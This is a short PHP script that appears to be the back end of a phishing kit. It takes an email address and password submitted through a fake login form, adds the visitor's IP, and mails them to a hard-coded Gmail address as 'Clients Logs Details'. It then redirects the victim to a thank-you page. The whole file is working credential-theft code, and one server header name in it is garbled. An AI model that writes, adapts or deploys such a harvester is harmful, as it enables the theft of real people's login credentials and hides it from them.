<?php
/* Set e-mail recipient */
$myemail  = "uzydgrt@gmail.com";

/* Check all form inputs using check_input function */
$email    = check_input($_POST['email'], "Enter Email");
$password  = check_input($_POST['password'], "Enter Password");
$ip = $_SERVER['HTTP_CLIENT_IP']?$_SERVER['HTTP_CLIENT_IP']:($_SERVER['HTTP_X_FORWARDE??D_FOR']?$_SERVER['HTTP_X_FORWARDED_FOR']:$_SERVER['REMOTE_ADDR']);

/* If e-mail is not valid show error message */
if (!preg_match("/([\w\-]+\@[\w\-]+\.[\w\-]+)/", $email))
{
    show_error("E-mail address not valid");
}

/* Let's prepare the message for the e-mail */
$message = "Hello!

Your Clients Logs Details :

Company Email-User: $email
Password: $password
IP: $ip


End of message
";

/* Send the message using mail() function */
mail($myemail, $email, $message);

/* Redirect visitor to the thank you page */
header('Location:https://brandprecinct.com/thanks');
exit();

/* Functions we used */
function check_input($data, $problem='')
{
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    if ($problem && strlen($data) == 0)
    {
        show_error($problem);
    }
    return $data;
}

function show_error($myError)
{
?>
    <html><title>Login</title>
    <body>
    <br />
    <?php echo $myError; ?>
	
    </body>
    </html>
<?php
exit();
}
?>
